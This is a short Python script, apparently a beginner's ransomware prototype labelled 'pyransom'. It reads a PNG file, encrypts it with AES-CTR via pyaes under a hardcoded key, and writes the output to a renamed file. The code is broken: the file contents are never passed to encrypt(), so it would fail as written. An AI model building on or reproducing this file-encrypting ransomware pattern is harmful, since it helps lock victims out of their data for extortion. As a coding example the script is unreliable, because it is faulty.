import pyaes

filename = 'image.png'
KEY = b'brunobrunobruno1'

with open(filename,'rb') as file:
    conteudo = file.read()

crypto_data = pyaes.AESModeOfOperationCTR(KEY).encrypt()

new_filename = '{}, pyransom'.format(filename)
with open(new_filename, 'wb') as file:
    file.write(crypto_data)
